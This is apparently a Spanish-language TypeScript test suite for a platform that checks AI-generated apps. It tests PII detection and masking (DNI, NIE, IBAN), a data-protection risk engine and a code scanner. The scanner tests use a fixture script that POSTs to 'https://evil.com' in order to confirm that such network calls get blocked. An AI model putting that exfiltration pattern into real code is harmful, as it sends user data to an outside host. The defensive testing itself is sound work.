import { test } from "node:test";
import assert from "node:assert/strict";
import { detectPii, isValidDni, isValidIban, isValidNie, maskPii } from "../shared/pii";
import { assess, emptyAnswers, sanitizeAnswers, type Answers } from "../shared/policy";
import { hardenHtml, scanCode } from "../shared/codeScan";

const answers = (p: Partial<Answers>): Answers => ({ ...emptyAnswers(), ...p });

// --- Detector de datos personales ------------------------------------------

test("valida DNI, NIE e IBAN con su dígito de control", () => {
  assert.ok(isValidDni("12345678Z"));
  assert.ok(!isValidDni("12345678A"));
  assert.ok(isValidNie("X1234567L"));
  assert.ok(isValidIban("ES91 2100 0418 4502 0005 1332"));
  assert.ok(!isValidIban("ES00 2100 0418 4502 0005 1332"));
});

test("detecta datos personales y categorías especiales en un ejemplo", () => {
  const f = detectPii("Ana Ejemplo;12345678Z;600 111 222;ana@correo.es;baja médica por embarazo");
  const kinds = f.map((x) => x.kind);
  assert.ok(kinds.includes("dni"));
  assert.ok(kinds.includes("telefono"));
  assert.ok(kinds.includes("email"));
  assert.ok(f.some((x) => x.category === "especiales"));
  // Nunca devuelve el valor completo.
  assert.ok(f.every((x) => !x.sample.includes("12345678Z")));
});

test("no confunde un DNI con dígito de control erróneo", () => {
  assert.equal(detectPii("referencia 12345678A").filter((x) => x.kind === "dni").length, 0);
});

test("enmascara antes de enviar a la IA", () => {
  const m = maskPii("Llamar a 612345678 o escribir a pepe@ayto.es, DNI 12345678Z, cuenta ES9121000418450200051332");
  assert.equal(m.replaced, 4);
  assert.ok(!/612345678|pepe@|12345678Z|ES91/.test(m.text));
  assert.match(m.text, /\[TELEFONO\].*\[EMAIL\].*\[DNI\].*\[IBAN\]/);
});

test("detecta credenciales", () => {
  assert.ok(detectPii("usuario: admin password: Secreta123").some((x) => x.category === "credenciales"));
});

// --- Motor de riesgo -------------------------------------------------------

test("herramienta personal sin datos: riesgo bajo", () => {
  const a = assess(answers({ data: ["ninguno"], audience: "personal" }));
  assert.equal(a.level, "bajo");
  assert.equal(a.constraints.syntheticDataOnly, false);
});

test("datos de contacto para el equipo: riesgo medio", () => {
  const a = assess(answers({ data: ["identificativos", "contacto"], audience: "equipo", origin: ["propios"] }));
  assert.equal(a.level, "medio");
  assert.ok(a.constraints.privacyNotice);
  assert.ok(a.constraints.deleteButton);
});

test("datos de salud: riesgo alto y solo prototipo", () => {
  const a = assess(answers({ data: ["especiales"], audience: "equipo" }));
  assert.equal(a.level, "alto");
  assert.ok(a.constraints.syntheticDataOnly);
  assert.equal(a.constraints.storage, "ninguno");
});

test("datos especialmente protegidos al público: no permitido", () => {
  assert.equal(assess(answers({ data: ["vulnerables"], audience: "publico" })).level, "no_permitido");
});

test("perfilado de personas: no permitido", () => {
  assert.equal(assess(answers({ data: ["identificativos"], decisions: "perfilado" })).level, "no_permitido");
});

test("datos personales en nube externa: no permitido", () => {
  assert.equal(assess(answers({ data: ["contacto"], storage: "nube_externa" })).level, "no_permitido");
});

test("lo detectado en los ejemplos cuenta aunque no se declare", () => {
  const a = assess(answers({ data: ["publicos"], detectedCategories: ["especiales"] }));
  assert.equal(a.level, "alto");
  assert.deepEqual(a.undeclared, ["especiales"]);
});

test("sanitizeAnswers descarta valores no válidos", () => {
  const a = sanitizeAnswers({ audience: "hackers", data: ["especiales", "inventado"], appName: 42 });
  assert.equal(a.audience, "personal");
  assert.deepEqual(a.data, ["especiales"]);
  assert.equal(a.appName, "");
});

// --- Revisión de código ----------------------------------------------------

const base = assess(answers({ data: ["ninguno"] })).constraints;

test("bloquea conexiones de red y scripts externos", () => {
  const f = scanCode(`<script src="https://cdn.x.com/a.js"></script><script>fetch('https://evil.com',{method:'POST'})</script>`, base);
  assert.ok(f.some((x) => x.rule === "script-externo" && x.severity === "bloqueante"));
  assert.ok(f.some((x) => x.rule === "red-fetch"));
});

test("localStorage solo si la evaluación lo permite", () => {
  const code = "<script>localStorage.setItem('a','b')</script>";
  assert.ok(scanCode(code, { ...base, storage: "ninguno" }).some((x) => x.severity === "bloqueante"));
  assert.ok(!scanCode(code, { ...base, storage: "local" }).some((x) => x.severity === "bloqueante"));
});

test("hardenHtml inserta la CSP y sustituye la de la IA", () => {
  const out = hardenHtml(`<html><head><meta http-equiv="Content-Security-Policy" content="default-src *"></head><body></body></html>`, base);
  assert.match(out, /connect-src 'none'/);
  assert.doesNotMatch(out, /default-src \*/);
  // El bloque de la plataforma no cuenta como infracción.
  assert.equal(scanCode(hardenHtml("<html><head></head><body>hola</body></html>", { ...base, ai: true }), { ...base, ai: true }).length, 0);
});
